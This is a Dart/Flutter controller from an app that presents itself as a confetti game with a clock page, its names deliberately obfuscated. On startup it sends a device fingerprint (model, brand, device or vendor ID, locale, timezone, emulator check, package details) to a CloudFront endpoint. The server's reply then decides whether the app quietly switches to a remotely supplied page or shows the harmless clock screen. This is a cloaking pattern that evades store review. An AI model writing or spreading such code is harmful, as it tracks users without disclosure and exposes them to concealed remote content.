import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ConfettiRoundLogic extends GetxController {

  var aomjbid = RxBool(false);
  var xkzrmiw = RxBool(true);
  var wlpn = RxString("");
  var vwcibg = RxBool(false);
  var jlmzhu = RxBool(true);
  final tskamrljno = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pjoqck();
  }


  Future<void> pjoqck() async {
    vwcibg.value = true;
    jlmzhu.value = true;
    xkzrmiw.value = false;

    tskamrljno.post("https://d1ek2gpyvxw2rs.cloudfront.net/BM1j9h8JszS?no_check",data: await pvgkyct()).then((value) {
      var avcfetzs = value.data["avcfetzs"] as String;
      var pgrtnxk = value.data["pgrtnxk"] as bool;
      if (pgrtnxk) {
        wlpn.value = avcfetzs;
        zwyn();
      } else {
        bwjh();
      }
    }).catchError((e) {
      xkzrmiw.value = true;
      jlmzhu.value = true;
      vwcibg.value = false;
    });
  }

  Future<Map<String, dynamic>> pvgkyct() async {
    final DeviceInfoPlugin bpyz = DeviceInfoPlugin();
    PackageInfo cjanb_tayw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var miqzod = Platform.localeName;
    var SItsF = currentTimeZone;

    var VHycRMln = cjanb_tayw.packageName;
    var JDxP = cjanb_tayw.version;
    var paJrbVF = cjanb_tayw.buildNumber;

    var IulKS = cjanb_tayw.appName;
    var bkjW = "";
    var ulzAG  = "";
    var YgtBnwf = "";
    var ftqboy = "";
    var tmspxwb = "";
    var hwtvze = "";
    var ifuxlwqc = "";
    var fsjeclbv = "";
    var kaogx = "";
    var glcfazdn = "";
    var wkeqi = "";


    var jRbBiPOJ = "";
    var StDIUk = false;

    if (GetPlatform.isAndroid) {
      jRbBiPOJ = "android";
      var htfizy = await bpyz.androidInfo;

      YgtBnwf = htfizy.brand;

      bkjW  = htfizy.model;
      ulzAG = htfizy.id;

      StDIUk = htfizy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jRbBiPOJ = "ios";
      var nuvlwermo = await bpyz.iosInfo;
      YgtBnwf = nuvlwermo.name;
      bkjW = nuvlwermo.model;

      ulzAG = nuvlwermo.identifierForVendor ?? "";
      StDIUk  = nuvlwermo.isPhysicalDevice;
    }

    var res = {
      "IulKS": IulKS,
      "paJrbVF": paJrbVF,
      "JDxP": JDxP,
      "VHycRMln": VHycRMln,
      "bkjW": bkjW,
      "YgtBnwf": YgtBnwf,
      "ulzAG": ulzAG,
      "miqzod": miqzod,
      "jRbBiPOJ": jRbBiPOJ,
      "kaogx" : kaogx,
      "StDIUk": StDIUk,
      "ftqboy" : ftqboy,
      "tmspxwb" : tmspxwb,
      "hwtvze" : hwtvze,
      "ifuxlwqc" : ifuxlwqc,
      "SItsF": SItsF,
      "fsjeclbv" : fsjeclbv,
      "glcfazdn" : glcfazdn,
      "wkeqi" : wkeqi,

    };
    return res;
  }

  Future<void> bwjh() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> zwyn() async {
    Get.offNamed("/Outreload");
  }

}
